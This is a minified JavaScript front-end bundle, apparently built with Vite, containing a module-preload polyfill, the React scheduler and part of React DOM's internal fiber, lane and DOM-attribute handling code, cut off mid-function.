import{r as jx,a as se,b as Of,j as r,m as di}from"./vendor-motion-B4M0nVTI.js";import{r as Df}from"./vendor-react-BOmfL7L-.js";import{h as Tf}from"./vendor-highlighter-n_OQhMto.js";(function(){const l=document.createElement("link").relList;if(l&&l.supports&&l.supports("modulepreload"))return;for(const f of document.querySelectorAll('link[rel="modulepreload"]'))m(f);new MutationObserver(f=>{for(const j of f)if(j.type==="childList")for(const A of j.addedNodes)A.tagName==="LINK"&&A.rel==="modulepreload"&&m(A)}).observe(document,{childList:!0,subtree:!0});function u(f){const j={};return f.integrity&&(j.integrity=f.integrity),f.referrerPolicy&&(j.referrerPolicy=f.referrerPolicy),f.crossOrigin==="use-credentials"?j.credentials="include":f.crossOrigin==="anonymous"?j.credentials="omit":j.credentials="same-origin",j}function m(f){if(f.ep)return;f.ep=!0;const j=u(f);fetch(f.href,j)}})();var Nl={exports:{}},Ps={},Ll={exports:{}},zl={};var Hu;function qf(){return Hu||(Hu=1,(function(i){function l(E,N){var H=E.length;E.push(N);e:for(;0<H;){var ce=H-1>>>1,z=E[ce];if(0<f(z,N))E[ce]=N,E[H]=z,H=ce;else break e}}function u(E){return E.length===0?null:E[0]}function m(E){if(E.length===0)return null;var N=E[0],H=E.pop();if(H!==N){E[0]=H;e:for(var ce=0,z=E.length,Ue=z>>>1;ce<Ue;){var be=2*(ce+1)-1,ne=E[be],Ee=be+1,ge=E[Ee];if(0>f(ne,H))Ee<z&&0>f(ge,ne)?(E[ce]=ge,E[Ee]=H,ce=Ee):(E[ce]=ne,E[be]=H,ce=be);else if(Ee<z&&0>f(ge,H))E[ce]=ge,E[Ee]=H,ce=Ee;else break e}}return N}function f(E,N){var H=E.sortIndex-N.sortIndex;return H!==0?H:E.id-N.id}if(i.unstable_now=void 0,typeof performance=="object"&&typeof performance.now=="function"){var j=performance;i.unstable_now=function(){return j.now()}}else{var A=Date,R=A.now();i.unstable_now=function(){return A.now()-R}}var O=[],w=[],D=1,k=null,U=3,$=!1,Y=!1,G=!1,K=!1,oe=typeof setTimeout=="function"?setTimeout:null,Pe=typeof clearTimeout=="function"?clearTimeout:null,ye=typeof setImmediate<"u"?setImmediate:null;function Te(E){for(var N=u(w);N!==null;){if(N.callback===null)m(w);else if(N.startTime<=E)m(w),N.sortIndex=N.expirationTime,l(O,N);else break;N=u(w)}}function ze(E){if(G=!1,Te(E),!Y)if(u(O)!==null)Y=!0,Me||(Me=!0,Ve());else{var N=u(w);N!==null&&Ye(ze,N.startTime-E)}}var Me=!1,Je=-1,I=5,qe=-1;function Tr(){return K?!0:!(i.unstable_now()-qe<I)}function za(){if(K=!1,Me){var E=i.unstable_now();qe=E;var N=!0;try{e:{Y=!1,G&&(G=!1,Pe(Je),Je=-1),$=!0;var H=U;try{a:{for(Te(E),k=u(O);k!==null&&!(k.expirationTime>E&&Tr());){var ce=k.callback;if(typeof ce=="function"){k.callback=null,U=k.priorityLevel;var z=ce(k.expirationTime<=E);if(E=i.unstable_now(),typeof z=="function"){k.callback=z,Te(E),N=!0;break a}k===u(O)&&m(O),Te(E)}else m(O);k=u(O)}if(k!==null)N=!0;else{var Ue=u(w);Ue!==null&&Ye(ze,Ue.startTime-E),N=!1}}break e}finally{k=null,U=H,$=!1}N=void 0}}finally{N?Ve():Me=!1}}}var Ve;if(typeof ye=="function")Ve=function(){ye(za)};else if(typeof MessageChannel<"u"){var qr=new MessageChannel,wa=qr.port2;qr.port1.onmessage=za,Ve=function(){wa.postMessage(null)}}else Ve=function(){oe(za,0)};function Ye(E,N){Je=oe(function(){E(i.unstable_now())},N)}i.unstable_IdlePriority=5,i.unstable_ImmediatePriority=1,i.unstable_LowPriority=4,i.unstable_NormalPriority=3,i.unstable_Profiling=null,i.unstable_UserBlockingPriority=2,i.unstable_cancelCallback=function(E){E.callback=null},i.unstable_forceFrameRate=function(E){0>E||125<E?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):I=0<E?Math.floor(1e3/E):5},i.unstable_getCurrentPriorityLevel=function(){return U},i.unstable_next=function(E){switch(U){case 1:case 2:case 3:var N=3;break;default:N=U}var H=U;U=N;try{return E()}finally{U=H}},i.unstable_requestPaint=function(){K=!0},i.unstable_runWithPriority=function(E,N){switch(E){case 1:case 2:case 3:case 4:case 5:break;default:E=3}var H=U;U=E;try{return N()}finally{U=H}},i.unstable_scheduleCallback=function(E,N,H){var ce=i.unstable_now();switch(typeof H=="object"&&H!==null?(H=H.delay,H=typeof H=="number"&&0<H?ce+H:ce):H=ce,E){case 1:var z=-1;break;case 2:z=250;break;case 5:z=1073741823;break;case 4:z=1e4;break;default:z=5e3}return z=H+z,E={id:D++,callback:N,priorityLevel:E,startTime:H,expirationTime:z,sortIndex:-1},H>ce?(E.sortIndex=H,l(w,E),u(O)===null&&E===u(w)&&(G?(Pe(Je),Je=-1):G=!0,Ye(ze,H-ce))):(E.sortIndex=z,l(O,E),Y||$||(Y=!0,Me||(Me=!0,Ve()))),E},i.unstable_shouldYield=Tr,i.unstable_wrapCallback=function(E){var N=U;return function(){var H=U;U=N;try{return E.apply(this,arguments)}finally{U=H}}}})(zl)),zl}var Zu;function Nf(){return Zu||(Zu=1,Ll.exports=qf()),Ll.exports}var Qu;function Lf(){if(Qu)return Ps;Qu=1;var i=Nf(),l=jx(),u=Df();function m(e){var a="https://react.dev/errors/"+e;if(1<arguments.length){a+="?args[]="+encodeURIComponent(arguments[1]);for(var t=2;t<arguments.length;t++)a+="&args[]="+encodeURIComponent(arguments[t])}return"Minified React error #"+e+"; visit "+a+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function f(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function j(e){var a=e,t=e;if(e.alternate)for(;a.return;)a=a.return;else{e=a;do a=e,(a.flags&4098)!==0&&(t=a.return),e=a.return;while(e)}return a.tag===3?t:null}function A(e){if(e.tag===13){var a=e.memoizedState;if(a===null&&(e=e.alternate,e!==null&&(a=e.memoizedState)),a!==null)return a.dehydrated}return null}function R(e){if(j(e)!==e)throw Error(m(188))}function O(e){var a=e.alternate;if(!a){if(a=j(e),a===null)throw Error(m(188));return a!==e?null:e}for(var t=e,s=a;;){var o=t.return;if(o===null)break;var n=o.alternate;if(n===null){if(s=o.return,s!==null){t=s;continue}break}if(o.child===n.child){for(n=o.child;n;){if(n===t)return R(o),e;if(n===s)return R(o),a;n=n.sibling}throw Error(m(188))}if(t.return!==s.return)t=o,s=n;else{for(var c=!1,x=o.child;x;){if(x===t){c=!0,t=o,s=n;break}if(x===s){c=!0,s=o,t=n;break}x=x.sibling}if(!c){for(x=n.child;x;){if(x===t){c=!0,t=n,s=o;break}if(x===s){c=!0,s=n,t=o;break}x=x.sibling}if(!c)throw Error(m(189))}}if(t.alternate!==s)throw Error(m(190))}if(t.tag!==3)throw Error(m(188));return t.stateNode.current===t?e:a}function w(e){var a=e.tag;if(a===5||a===26||a===27||a===6)return e;for(e=e.child;e!==null;){if(a=w(e),a!==null)return a;e=e.sibling}return null}var D=Object.assign,k=Symbol.for("react.element"),U=Symbol.for("react.transitional.element"),$=Symbol.for("react.portal"),Y=Symbol.for("react.fragment"),G=Symbol.for("react.strict_mode"),K=Symbol.for("react.profiler"),oe=Symbol.for("react.provider"),Pe=Symbol.for("react.consumer"),ye=Symbol.for("react.context"),Te=Symbol.for("react.forward_ref"),ze=Symbol.for("react.suspense"),Me=Symbol.for("react.suspense_list"),Je=Symbol.for("react.memo"),I=Symbol.for("react.lazy"),qe=Symbol.for("react.activity"),Tr=Symbol.for("react.memo_cache_sentinel"),za=Symbol.iterator;function Ve(e){return e===null||typeof e!="object"?null:(e=za&&e[za]||e["@@iterator"],typeof e=="function"?e:null)}var qr=Symbol.for("react.client.reference");function wa(e){if(e==null)return null;if(typeof e=="function")return e.$$typeof===qr?null:e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case Y:return"Fragment";case K:return"Profiler";case G:return"StrictMode";case ze:return"Suspense";case Me:return"SuspenseList";case qe:return"Activity"}if(typeof e=="object")switch(e.$$typeof){case $:return"Portal";case ye:return(e.displayName||"Context")+".Provider";case Pe:return(e._context.displayName||"Context")+".Consumer";case Te:var a=e.render;return e=e.displayName,e||(e=a.displayName||a.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case Je:return a=e.displayName||null,a!==null?a:wa(e.type)||"Memo";case I:a=e._payload,e=e._init;try{return wa(e(a))}catch{}}return null}var Ye=Array.isArray,E=l.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,N=u.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,H={pending:!1,data:null,method:null,action:null},ce=[],z=-1;function Ue(e){return{current:e}}function be(e){0>z||(e.current=ce[z],ce[z]=null,z--)}function ne(e,a){z++,ce[z]=e.current,e.current=a}var Ee=Ue(null),ge=Ue(null),Se=Ue(null),Xa=Ue(null);function Nr(e,a){switch(ne(Se,a),ne(ge,e),ne(Ee,null),a.nodeType){case 9:case 11:e=(e=a.documentElement)&&(e=e.namespaceURI)?ju(e):0;break;default:if(e=a.tagName,a=a.namespaceURI)a=ju(a),e=yu(a,e);else switch(e){case"svg":e=1;break;case"math":e=2;break;default:e=0}}be(Ee),ne(Ee,e)}function je(){be(Ee),be(ge),be(Se)}function rt(e){e.memoizedState!==null&&ne(Xa,e);var a=Ee.current,t=yu(a,e.type);a!==t&&(ne(ge,e),ne(Ee,t))}function Ba(e){ge.current===e&&(be(Ee),be(ge)),Xa.current===e&&(be(Xa),Ls._currentValue=H)}var rr=Object.prototype.hasOwnProperty,Lr=i.unstable_scheduleCallback,tr=i.unstable_cancelCallback,ip=i.unstable_shouldYield,np=i.unstable_requestPaint,Ma=i.unstable_now,lp=i.unstable_getCurrentPriorityLevel,ec=i.unstable_ImmediatePriority,ac=i.unstable_UserBlockingPriority,Hs=i.unstable_NormalPriority,cp=i.unstable_LowPriority,rc=i.unstable_IdlePriority,dp=i.log,mp=i.unstable_setDisableYieldValue,kt=null,ia=null;function sr(e){if(typeof dp=="function"&&mp(e),ia&&typeof ia.setStrictMode=="function")try{ia.setStrictMode(kt,e)}catch{}}var na=Math.clz32?Math.clz32:pp,up=Math.log,xp=Math.LN2;function pp(e){return e>>>=0,e===0?32:31-(up(e)/xp|0)|0}var Zs=256,Qs=4194304;function zr(e){var a=e&42;if(a!==0)return a;switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:return 64;case 128:return 128;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194048;case 4194304:case 8388608:case 16777216:case 33554432:return e&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return e}}function Ys(e,a,t){var s=e.pendingLanes;if(s===0)return 0;var o=0,n=e.suspendedLanes,c=e.pingedLanes;e=e.warmLanes;var x=s&134217727;return x!==0?(s=x&~n,s!==0?o=zr(s):(c&=x,c!==0?o=zr(c):t||(t=x&~e,t!==0&&(o=zr(t))))):(x=s&~n,x!==0?o=zr(x):c!==0?o=zr(c):t||(t=s&~e,t!==0&&(o=zr(t)))),o===0?0:a!==0&&a!==o&&(a&n)===0&&(n=o&-o,t=a&-a,n>=t||n===32&&(t&4194048)!==0)?a:o}function Ft(e,a){return(e.pendingLanes&~(e.suspendedLanes&~e.pingedLanes)&a)===0}function hp(e,a){switch(e){case 1:case 2:case 4:case 8:case 64:return a+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return a+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function tc(){var e=Zs;return Zs<<=1,(Zs&4194048)===0&&(Zs=256),e}function sc(){var e=Qs;return Qs<<=1,(Qs&62914560)===0&&(Qs=4194304),e}function yi(e){for(var a=[],t=0;31>t;t++)a.push(e);return a}function Gt(e,a){e.pendingLanes|=a,a!==268435456&&(e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0)}function fp(e,a,t,s,o,n){var c=e.pendingLanes;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0,e.expiredLanes&=t,e.entangledLanes&=t,e.errorRecoveryDisabledLanes&=t,e.shellSuspendCounter=0;var x=e.entanglements,p=e.expirationTimes,v=e.hiddenUpdates;for(t=c&~t;0<t;){var C=31-na(t),M=1<<C;x[C]=0,p[C]=-1;var y=v[C];if(y!==null)for(v[C]=null,C=0;C<y.length;C++){var S=y[C];S!==null&&(S.lane&=-536870913)}t&=~M}s!==0&&oc(e,s,0),n!==0&&o===0&&e.tag!==0&&(e.suspendedLanes|=n&~(c&~a))}function oc(e,a,t){e.pendingLanes|=a,e.suspendedLanes&=~a;var s=31-na(a);e.entangledLanes|=a,e.entanglements[s]=e.entanglements[s]|1073741824|t&4194090}function ic(e,a){var t=e.entangledLanes|=a;for(e=e.entanglements;t;){var s=31-na(t),o=1<<s;o&a|e[s]&a&&(e[s]|=a),t&=~o}}function Si(e){switch(e){case 2:e=1;break;case 8:e=4;break;case 32:e=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:e=128;break;case 268435456:e=134217728;break;default:e=0}return e}function Ai(e){return e&=-e,2<e?8<e?(e&134217727)!==0?32:268435456:8:2}function nc(){var e=N.p;return e!==0?e:(e=window.event,e===void 0?32:Uu(e.type))}function bp(e,a){var t=N.p;try{return N.p=e,a()}finally{N.p=t}}var or=Math.random().toString(36).slice(2),Ke="__reactFiber$"+or,aa="__reactProps$"+or,tt="__reactContainer$"+or,Ri="__reactEvents$"+or,gp="__reactListeners$"+or,vp="__reactHandles$"+or,lc="__reactResources$"+or,Vt="__reactMarker$"+or;function Ei(e){delete e[Ke],delete e[aa],delete e[Ri],delete e[gp],delete e[vp]}function st(e){var a=e[Ke];if(a)return a;for(var t=e.parentNode;t;){if(a=t[tt]||t[Ke]){if(t=a.alternate,a.child!==null||t!==null&&t.child!==null)for(e=Eu(e);e!==null;){if(t=e[Ke])return t;e=Eu(e)}return a}e=t,t=e.parentNode}return null}function ot(e){if(e=e[Ke]||e[tt]){var a=e.tag;if(a===5||a===6||a===13||a===26||a===27||a===3)return e}return null}function Ht(e){var a=e.tag;if(a===5||a===26||a===27||a===6)return e.stateNode;throw Error(m(33))}function it(e){var a=e[lc];return a||(a=e[lc]={hoistableStyles:new Map,hoistableScripts:new Map}),a}function Ie(e){e[Vt]=!0}var cc=new Set,dc={};function wr(e,a){nt(e,a),nt(e+"Capture",a)}function nt(e,a){for(dc[e]=a,e=0;e<a.length;e++)cc.add(a[e])}var jp=RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"),mc={},uc={};function yp(e){return rr.call(uc,e)?!0:rr.call(mc,e)?!1:jp.test(e)?uc[e]=!0:(mc[e]=!0,!1)}function Ks(e,a,t){if(yp(a))if(t===null)e.removeAttribute(a);else{switch(typeof t){case"undefined":case"function":case"symbol":e.removeAttribute(a);return;case"boolean":var s=a.toLowerCase().slice(0,5);if(s!=="data-"&&s!=="aria-"){e.removeAttribute(a);return}}e.setAttribute(a,""+t)}}function Ws(e,a,t){if(t===null)e.removeAttribute(a);else{switch(typeof t){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(a);return}e.setAttribute(a,""+t)}}function Pa(e,a,t,s){if(s===null)e.removeAttribute(t);else{switch(typeof s){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(t);return}e.setAttributeNS(a,t,""+s)}}var Ci,xc;function lt(e){if(Ci===void 0)try{throw Error()}catch(t){var a=t.stack.trim().match(/\n( *(at )?)/);Ci=a&&a[1]||"",xc=-1<t.stack.indexOf(`
    at`)?" (<anonymous>)":-1<t.stack.indexOf("@")?"@unknown:0:0":""}return`
`+Ci+e+xc}var _i=!1;function Mi(e,a){if(!e||_i)return"";_i=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var s={DetermineComponentFrameRoot:function(){try{if(a){var M=function(){throw Error()};if(Object.defineProperty(M.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(M,[])}catch(S){var y=S}Reflect.construct(e,[],M)}else{try{M.call()}catch(S){y=S}e.call(M.prototype)}}else{try{throw Error()}catch(S){y=S}(M=e())&&typeof M.catch=="function"&&M.catch(function(){})}}catch(S){if(S&&y&&typeof S.stack=="string")return[S.stack,y.stack]}return[null,null]}};s.DetermineComponentFrameRoot.displayName="DetermineComponentFrameRoot";var o=Object.getOwnPropertyDescriptor(s.DetermineComponentFrameRoot,"name");o&&o.configurable&&Object.defineProperty(s.DetermineComponentFrameRoot,"name",{value:"DetermineComponentFrameRoot"});var n=s.DetermineComponentFrameRoot(),c=n[0],x=n[1];if(c&&x){var p=c.split(`
`),v=x.split(`
`);for(o=s=0;s<p.length&&!p[s].includes("DetermineComponentFrameRoot");)s++;for(;o<v.length&&!v[o].includes("DetermineComponentFrameRoot");)o++;if(s===p.length||o===v.length)for(s=p.length-1,o=v.length-1;1<=s&&0<=o&&p[s]!==v[o];)o--;for(;1<=s&&0<=o;s--,o--)if(p[s]!==v[o]){if(s!==1||o!==1)do if(s--,o--,0>o||p[s]!==v[o]){var C=`
`+p[s].replace(" at new "," at ");return e.displayName&&C.includes("<anonymous>")&&(C=C.replace("<anonymous>",e.displayName)),C}while(1<=s&&0<=o);break}}}finally{_i=!1,Error.prepareStackTrace=t}return(t=e?e.displayName||e.name:"")?lt(t):""}function Sp(e){switch(e.tag){case 26:case 27:case 5:return lt(e.type);case 16:return lt("Lazy");case 13:return lt("Suspense");case 19:return lt("SuspenseList");case 0:case 15:return Mi(e.type,!1);case 11:return Mi(e.type.render,!1);case 1:return Mi(e.type,!0);case 31:return lt("Activity");default:return""}}function pc(e){try{var a="";do a+=Sp(e),e=e.return;while(e);return a}catch(t){return`
Error generating stack: `+t.message+`
`+t.stack}}function ha(e){switch(typeof e){case"bigint":case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function hc(e){var a=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(a==="checkbox"||a==="radio")}function Ap(e){var a=hc(e)?"checked":"value",t=Object.getOwnPropertyDescriptor(e.constructor.prototype,a),s=""+e[a];if(!e.hasOwnProperty(a)&&typeof t<"u"&&typeof t.get=="function"&&typeof t.set=="function"){var o=t.get,n=t.set;return Object.defineProperty(e,a,{configurable:!0,get:function(){return o.call(this)},set:function(c){s=""+c,n.call(this,c)}}),Object.defineProperty(e,a,{enumerable:t.enumerable}),{getValue:function(){return s},setValue:function(c){s=""+c},stopTracking:function(){e._valueTracker=null,delete e[a]}}}}function Js(e){e._valueTracker||(e._valueTracker=Ap(e))}function fc(e){if(!e)return!1;var a=e._valueTracker;if(!a)return!0;var t=a.getValue(),s="";return e&&(s=hc(e)?e.checked?"true":"false":e.value),e=s,e!==t?(a.setValue(e),!0):!1}function $s(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}var Rp=/[\n"\\]/g;function fa(e){return e.replace(Rp,function(a){return"\\"+a.charCodeAt(0).toString(16)+" "})}function Oi(e,a,t,s,o,n,c,x){e.name="",c!=null&&typeof c!="function"&&typeof c!="symbol"&&typeof c!="boolean"?e.type=c:e.removeAttribute("type"),a!=null?c==="number"?(a===0&&e.value===""||e.value!=a)&&(e.value=""+ha(a)):e.value!==""+ha(a)&&(e.value=""+ha(a)):c!=="submit"&&c!=="reset"||e.removeAttribute("value"),a!=null?Di(e,c,ha(a)):t!=null?Di(e,c,ha(t)):s!=null&&e.removeAttribute("value"),o==null&&n!=null&&(e.defaultChecked=!!n),o!=null&&(e.checked=o&&typeof o!="function"&&typeof o!="symbol"),x!=null&&typeof x!="function"&&typeof x!="symbol"&&typeof x!="boolean"?e.name=""+ha(x):e.removeAttribute("name")}function bc(e,a,t,s,o,n,c,x){if(n!=null&&typeof n!="function"&&typeof n!="symbol"&&typeof n!="boolean"&&(e.type=n),a!=null||t!=null){if(!(n!=="submit"&&n!=="reset"||a!=null))return;t=t!=null?""+ha(t):"",a=a!=null?""+ha(a):t,x||a===e.value||(e.value=a),e.defaultValue=a}s=s??o,s=typeof s!="function"&&typeof s!="symbol"&&!!s,e.checked=x?e.checked:!!s,e.defaultChecked=!!s,c!=null&&typeof c!="function"&&typeof c!="symbol"&&typeof c!="boolean"&&(e.name=c)}function Di(e,a,t){a==="number"&&$s(e.ownerDocument)===e||e.defaultValue===""+t||(e.defaultValue=""+t)}function ct(e,a,t,s){if(e=e.options,a){a={};for(var o=0;o<t.length;o++)a["$"+t[o]]=!0;for(t=0;t<e.length;t++)o=a.hasOwnProperty("$"+e[t].value),e[t].selected!==o&&(e[t].selected=o),o&&s&&(e[t].defaultSelected=!0)}else{for(t=""+ha(t),a=null,o=0;o<e.length;o++){if(e[o].value===t){e[o].selected=!0,s&&(e[o].defaultSelected=!0);return}a!==null||e[o].disabled||(a=e[o])}a!==null&&(a.selected=!0)}}function gc(e,a,t){if(a!=null&&(a=""+ha(a),a!==e.value&&(e.value=a),t==null)){e.defaultValue!==a&&(e.defaultValue=a);return}e.defaultValue=t!=null?""+ha(t):""}function vc(e,a,t,s){if(a==null){if(s!=null){if(t!=null)throw Error(m(92));if(Ye(s)){if(1<s.length)throw Error(m(93));s=s[0]}t=s}t==null&&(t=""),a=t}t=ha(a),e.defaultValue=t,s=e.textContent,s===t&&s!==""&&s!==null&&(e.value=s)}function dt(e,a){if(a){var t=e.firstChild;if(t&&t===e.lastChild&&t.nodeType===3){t.nodeValue=a;return}}e.textContent=a}var Ep=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function jc(e,a,t){var s=a.indexOf("--")===0;t==null||typeof t=="boolean"||t===""?s?e.setProperty(a,""):a==="float"?e.cssFloat="":e[a]="":s?e.setProperty(a,t):typeof t!="number"||t===0||Ep.has(a)?a==="float"?e.cssFloat=t:e[a]=(""+t).trim():e[a]=t+"px"}function yc(e,a,t){if(a!=null&&typeof a!="object")throw Error(m(62));if(e=e.style,t!=null){for(var s in t)!t.hasOwnProperty(s)||a!=null&&a.hasOwnProperty(s)||(s.indexOf("--")===0?e.setProperty(s,""):s==="float"?e.cssFloat="":e[s]="");for(var o in a)s=a[o],a.hasOwnProperty(o)&&t[o]!==s&&jc(e,o,s)}else for(var n in a)a.hasOwnProperty(n)&&jc(e,n,a[n])}function Ti(e){if(e.indexOf("-")===-1)return!1;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Cp=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),_p=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function eo(e){return _p.test(""+e)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":e}var qi=null;function Ni(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var mt=null,ut=null;function Sc(e){var a=ot(e);if(a&&(e=a.stateNode)){var t=e[aa]||null;e:switch(e=a.stateNode,a.type){case"input":if(Oi(e,t.value,t.defaultValue,t.defaultValue,t.checked,t.defaultChecked,t.type,t.name),a=t.name,t.type==="radio"&&a!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll('input[name="'+fa(""+a)+'"][type="radio"]'),a=0;a<t.length;a++){var s=t[a];if(s!==e&&s.form===e.form){var o=s[aa]||null;if(!o)throw Error(m(90));Oi(s,o.value,o.defaultValue,o.defaultValue,o.checked,o.defaultChecked,o.type,o.name)}}for(a=0;a<t.length;a++)s=t[a],s.form===e.form&&fc(s)}break e;case"textarea":gc(e,t.value,t.defaultValue);break e;case"select":a=t.value,a!=null&&ct(e,!!t.multiple,a,!1)}}}var Li=!1;function Ac(e,a,t){if(Li)return e(a,t);Li=!0;try{var s=e(a);return s}finally{if(Li=!1,(mt!==null||ut!==null)&&(Uo(),mt&&(a=mt,e=ut,ut=mt=null,Sc(a),e)))for(a=0;a<e.length;a++)Sc(e[a])}}function Zt(e,a){var t=e.stateNode;if(t===null)return null;var s=t[aa]||null;if(s===null)return null;t=s[a];e:switch(a){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(s=!s.disabled)||(e=e.type,s=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!s;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(m(231,a,typeof t));return t}var Ua=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),zi=!1;if(Ua)try{var Qt={};Object.defineProperty(Qt,"passive",{get:function(){zi=!0}}),window.addEventListener("test",Qt,Qt),window.removeEventListener("test",Qt,Qt)}catch{zi=!1}var ir=null,wi=null,ao=null;function Rc(){if(ao)return ao;var e,a=wi,t=a.length,s,o="value"in ir?ir.value:ir.textContent,n=o.length;for(e=0;e<t&&a[e]===o[e];e++);var c=t-e;for(s=1;s<=c&&a[t-s]===o[n-s];s++);return 